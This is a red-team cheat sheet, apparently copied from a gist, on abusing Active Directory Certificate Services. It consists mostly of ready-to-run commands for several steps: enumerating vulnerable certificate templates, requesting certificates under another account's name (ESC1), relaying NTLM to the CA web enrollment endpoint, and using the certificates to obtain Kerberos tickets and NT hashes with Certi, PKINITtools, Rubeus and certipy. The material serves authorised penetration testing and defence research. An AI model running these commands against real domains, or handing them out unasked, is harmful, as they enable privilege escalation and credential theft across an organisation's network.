# AD Certificate Services (PKI Abuse)
(copied from https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)

Some golden links when you are having issues:
https://social.technet.microsoft.com/Forums/windows/en-US/96016a13-9062-4842-b534-203d2f400cae/ca-certificate-request-error-quotdenied-by-policy-module-0x80094800quot-windows-server-2008?forum=winserversecurity


## Enumerating ADCS On Linux

Download and install Certi
```shell
git clone https://github.com/eloypgz/certi
cd certi
sudo python3 setup.py install
```

Certi only support kerberos auth, so to perform authenticated enumeration, you need to fetch a TGT for a valid user first.
```shell
getTGT.py '<domain>/<username>:<password>' -dc-ip <dc-ip>
```
Set the env var to the output ccache

```shell
export KRB5CCNAME=/full/path/to/<username>.ccache
```

Enumerate Certificate Authorities on the domain (CA's)
```shell
python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
```

Enumerate vuln templates
```shell
python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --vuln --enable
```

## Requesting certs from CA Linux
 Requesting a cert with an alt subject name (ESC1)
 ```shell
python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n --dc-ip <dc-ip> --template <vuln-template> --alt-name <target-domain-account>
```
## Authenticating using cert on Linux

Request an TGT from Certificate with Client Auth or Smart Card Auth
```shell
python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pfx-pass <certificate-password> admin_tgt.ccache   
 ```

Get NTHash from requestd TGT above (KEY is outputed from the command above) 
```shell
python3 getnthash.py -key <AS-REP-encryption-key> -dc-ip <dc-ip> <domain>/<username> output_tgt.ccache
```
Note: You have to change the KRB5CCNAME variable to the target users tgt ccache file first (admin_tgt.ccache above):
```shell
export KRB5CCNAME=/full/path/to/admin_tgt.ccache
```

## Relaying On Linux

Relaying incoming SMB/HTTP connection to ADCS to generate a certificate on

Fetch and install a custom fork of impacket
```shell
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
```

Create a virtual python env to contain this version of impacket (Avoid breaking the release you already have installed)
```shell
apt install python3-venv
python3 -m venv adcs-impacket
```

Move "into" this virutal env 
```shell
source adcs-impacket/bin/activate
```
Still inside the impacket folder

```shell
pip3 install .
```

You can now setup ntlmrelay for realying 
```shell
python3 examples/ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template <template-name>
```

## Authentication using certificate on Linux
```shell
python3 gettgtpkinit.py <domain>/<username> -pfx-base64 $(cat <base64-cert.file>) -dc-ip <dc-ip> out_tgt.ccache
```

# Pass-The-Certificate
From: https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate    
A Kerberos service ticket, can only be obtained by presenting a TGT. This TGT can be obtained by
a) ASREPRoast (if Kerberos pre-auth is disabled)
b) symmetrical pre-authentication (using a DES,RC4,AES128 or AES256 key)
c) asymmetrical pre-authentication (using certificates) --> This is also called PKINIT

Pass-The-Certificate is the fancy given name of this certificate based pre-authentication.   

NOTE: Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. 

## Windows
`Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show`   

NOTE: PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.   
`openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"`   

## Unix 
```
# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```
Alternatively, certipy (python) can be used:   
`certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'`   
Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file:   
`certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"`   

The ticket obtained can then be used to:   
1. authenticate with [pass-the-cache](https://www.thehacker.recipes/ad/movement/kerberos/ptc)   
2. conduct an [UnPAC-the-hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) attack. This can be done with getnthash.py from PKINITtools.   
3. obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from PKINITtools.   

NOTE: When using Certipy for Pass-the-Certificate, it automatically does UnPAC-the-hash to recover the account's NT hash, in addition to saving the TGT obtained.   
